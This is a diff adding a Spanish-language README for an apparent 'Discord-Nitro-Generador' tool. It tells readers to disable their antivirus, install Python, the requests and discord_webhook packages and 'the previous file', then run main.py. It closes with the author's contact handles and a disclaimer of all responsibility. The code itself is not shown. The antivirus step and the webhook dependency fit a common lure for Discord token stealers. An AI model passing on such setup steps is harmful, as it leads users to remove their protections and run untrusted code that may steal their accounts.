@@ -1,0 +1,32 @@
+(cosas muy importantes que debes tener o hacer para poder empezar el proceso, primero debes desactivar tu antivirus, despues instala esto "python, "el archivo anterior" y listo te dejare abajo el link para instalar python )
+
+
+tienes que tener 2 cosas, debes tener python y el archivo anterior ya instalados para que puedas empezar con el proceso
+
+
+primero debes abrir el cmd 
+
+ya que hayas entrado en el cmd pones lo siguiente "python -3 -m pip install discord_webhook" y despues de eso debes poner "python -3 -m pip install requests", y listo ya podras comenzar
+
+solo faltaria entrar al archivo "main.py" y te cargara el "Discord-Nitro-Generador" 
+
+
+
+
+
+link de python " https://www.python.org/ "
+
+
+
+
+cualquier error o duda no dudes en contactarme
+
+-discord: $𝑰 𝒍𝒊𝒌𝒆 𝒃𝒊𝒕𝒄𝒉𝒆𝒔$ #1462
+
+-youtube: 𝒉𝒕𝒕𝒑𝒔://𝒘𝒘𝒘.𝒚𝒐𝒖𝒕𝒖𝒃𝒆.𝒄𝒐𝒎/𝒄𝒉𝒂𝒏𝒏𝒆𝒍/𝑼𝑪𝒄𝑽𝒚𝑨𝑶𝒉𝑰𝒈𝒋𝑲𝒚𝟐𝟖𝟏𝑮𝑱𝑵𝑳𝟔𝒋𝟔𝑸/𝒗𝒊𝒅𝒆𝒐𝒔
+
+-gmail: @𝒆𝒍𝒑𝒆𝒑𝒆𝒑𝒆𝒑𝒆𝒗𝟏𝟐𝟑𝟑𝟐𝟏𝒔𝒄@𝒈𝒎𝒂𝒊𝒍.𝒄𝒐𝒎
+
+-instagram: "𝒀𝒂𝒙.𝒊𝒅𝒌"
+
+-Muchas gracias te espero en mi youtube pronto enseñare muchas cosas avanzadas (no me hago responsable de nada)
